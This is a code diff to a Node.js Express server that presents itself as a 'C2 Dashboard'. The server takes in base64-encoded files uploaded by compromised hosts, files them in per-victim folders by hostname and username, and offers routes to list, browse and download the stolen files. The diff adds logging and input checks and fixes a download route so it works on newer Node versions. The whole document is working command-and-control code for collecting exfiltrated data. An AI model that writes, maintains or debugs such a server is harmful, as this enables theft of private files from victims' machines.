@@ -7,7 +7,7 @@ const app = express();
 app.use(cors());
 app.use(express.json({ limit: "50mb" }));
 
-// 1. Setup paths and tokens
+// --- Determine folder path ---
 const VICTIMS_DIR = process.env.RAILWAY_VOLUME_MOUNT_PATH
   ? path.join(process.env.RAILWAY_VOLUME_MOUNT_PATH, "victims")
   : path.join(__dirname, "victims");
@@ -23,7 +23,7 @@ const SECRET_TOKEN = process.env.SECRET_TOKEN || "local_dev_token";
   }
 })();
 
-// 2. Dashboard
+// --- Dashboard ---
 app.get("/", async (req, res) => {
   if (req.headers.authorization !== `Bearer ${SECRET_TOKEN}`)
     return res.status(403).send("Unauthorized");
@@ -32,14 +32,15 @@ app.get("/", async (req, res) => {
     const victims = await fs.readdir(VICTIMS_DIR);
     res.send(`<h2>C2 Dashboard — ${victims.length} victims</h2>
       <ul>${victims.map(v => `<li><a href="/victim/${v}">${v}</a></li>`).join("")}</ul>`);
-  } catch (err) { res.status(500).send("Error"); }
+  } catch (err) { res.status(500).send("Read error"); }
 });
 
-// 3. Receive File
+// --- Receive file ---
 app.post("/send", async (req, res) => {
   const { hostname, username, file, token } = req.body;
   if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Unauthorized" });
-  
+  if (!file) return res.status(400).json({ error: "No file" });
+
   const safeFolder = path.basename(`${hostname}_${username}`);
   const safeFileName = file.name.replace(/\.\./g, "").replace(/[<>:"|?*]/g, "_");
   const filePath = path.join(VICTIMS_DIR, safeFolder, safeFileName);
@@ -47,11 +48,12 @@ app.post("/send", async (req, res) => {
   try {
     await fs.mkdir(path.dirname(filePath), { recursive: true });
     await fs.writeFile(filePath, Buffer.from(file.content, "base64"));
+    console.log(`[+] ${safeFolder} — saved ${safeFileName}`);
     res.json({ success: true });
   } catch (err) { res.status(500).json({ error: "Write failed" }); }
 });
 
-// 4. Browse Victim
+// --- Browse victim ---
 app.get("/victim/:id", async (req, res) => {
   const safeId = path.basename(req.params.id);
   const victimDir = path.join(VICTIMS_DIR, safeId);
@@ -62,10 +64,12 @@ app.get("/victim/:id", async (req, res) => {
   } catch (e) { res.status(404).send("Not found"); }
 });
 
-// 5. Download (REPLACES BOTH OLD DOWNLOAD ROUTES)
-app.get("/victim/:id/*", async (req, res) => {
+// --- FIXED DOWNLOAD ROUTE FOR NODE v22 ---
+// The ":path(*)" syntax tells Express to capture everything into req.params.path
+app.get("/victim/:id/:path(*)", async (req, res) => {
   const safeId = path.basename(req.params.id);
-  const nestedPath = req.params[0]; // Captures the full path after the ID
+  const nestedPath = req.params.path; // No longer using [0]
+  
   const filePath = path.join(VICTIMS_DIR, safeId, nestedPath);
 
   res.download(filePath, err => {
